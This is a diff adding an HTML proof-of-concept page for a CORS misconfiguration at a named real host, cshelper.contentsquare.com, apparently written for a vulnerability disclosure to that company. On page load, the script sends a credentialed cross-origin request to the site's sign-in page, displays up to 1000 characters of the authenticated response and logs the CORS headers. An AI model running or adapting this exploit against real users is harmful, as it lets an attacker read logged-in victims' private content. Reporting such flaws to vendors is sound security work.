@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit - cshelper.contentsquare.com</title>
+</head>
+<body>
+    <h2>CORS Exploitation PoC</h2>
+    <div id="result"></div>
+
+    <script>
+        function exploitCORS() {
+            // Create XMLHttpRequest with credentials
+            var xhr = new XMLHttpRequest();
+            xhr.withCredentials = true; // This is crucial!
+            
+            xhr.open('GET', 'https://cshelper.contentsquare.com/login/signin.aspx?returnTo=%2f', true);
+            
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        // Success - we can access the response
+                        document.getElementById('result').innerHTML = 
+                            '<h3>✓ SUCCESS: CORS Exploit Working!</h3>' +
+                            '<p>Response length: ' + xhr.responseText.length + ' characters</p>' +
+                            '<textarea style="width:100%; height:200px">' + 
+                            xhr.responseText.substring(0, 1000) + // Show first 1000 chars
+                            '</textarea>' +
+                            '<p><strong>Impact:</strong> An attacker can read authenticated content from cshelper.contentsquare.com</p>';
+                        
+                        // Log the CORS headers
+                        console.log('CORS Headers:');
+                        console.log('Access-Control-Allow-Origin:', xhr.getResponseHeader('Access-Control-Allow-Origin'));
+                        console.log('Access-Control-Allow-Credentials:', xhr.getResponseHeader('Access-Control-Allow-Credentials'));
+                        
+                    } else {
+                        document.getElementById('result').innerHTML = 
+                            '<h3>✗ Failed to exploit</h3>' +
+                            '<p>Status: ' + xhr.status + '</p>';
+                    }
+                }
+            };
+            
+            xhr.send();
+        }
+        
+        // Auto-execute when page loads
+        window.onload = exploitCORS;
+    </script>
+    
+    <p><strong>Note for Contentsquare:</strong> This PoC demonstrates that any domain can make authenticated requests to cshelper.contentsquare.com and read the responses.</p>
+</body>
+</html>
